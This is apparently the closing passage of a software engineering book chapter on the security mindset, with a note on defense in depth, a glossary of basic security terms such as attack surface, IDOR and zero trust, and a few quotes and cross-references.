**3. Defense in depth is not redundancy.** It is layers of different controls. Rate limiting + input validation + parameterized queries + a WAF are four different layers that each stop different attacks. A single "perfect" control is never perfect. Layers provide coverage when any one layer fails.

This chapter has given you the vocabulary and the frameworks. The practice is: look at the next system you design and ask, "what would an attacker do with this?"

---

## Quick Security Vocabulary Glossary

| Term | Definition |
|------|-----------|
| Attack surface | All the points where an attacker can try to enter or extract data |
| Blast radius | How much damage can result if this component is compromised |
| Defense in depth | Multiple independent security layers; no single point of failure |
| Fail closed | On error, deny access rather than allowing it |
| IDOR | Insecure Direct Object Reference — accessing another user's resource by guessing/changing an ID |
| Least privilege | Grant only the permissions a service/user actually needs, nothing more |
| MTTD | Mean Time to Detect — how long until a breach is discovered |
| Threat model | A structured analysis of what can go wrong in a system and how |
| Zero Trust | Never assume a request is trusted based on network location; verify every request |

---

> "Security is not a product you can buy; it is a process you practice." — This chapter is your practice guide.

> "The question is not whether your system will be attacked. The question is whether you will notice."

> "Every security control is a tradeoff. The goal is to make the right tradeoffs, not to maximize security at the expense of everything else."

---

*Pairs with Chapter 114 (API Design as a Discipline) for secure API design, Chapter 93 (Bonus Advanced Topics) for rate limiting patterns, and Chapter 56 (Metrics Collection) for security monitoring and anomaly detection.*

`Chapter 115 | Section 7: Engineering Excellence | Security Mindset`
